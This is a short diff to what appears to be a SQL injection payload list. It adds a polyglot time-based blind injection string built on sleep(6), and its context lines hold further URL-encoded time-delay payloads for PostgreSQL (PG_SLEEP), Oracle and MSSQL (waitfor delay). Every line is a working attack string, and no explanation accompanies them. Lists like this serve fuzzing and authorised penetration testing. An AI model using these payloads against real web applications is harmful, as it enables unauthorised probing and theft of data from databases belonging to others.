@@ -1,3 +1,7 @@
+(select(0)from(select(sleep(6)))v)/*'+
+(select(0)from(select(sleep(6)))v)+'"+
+(select(0)from(select(sleep(6)))v)+"*/
+
 admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--
 -6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw
 admin%20waitfor%20delay%20'0:0:15'%20--%20
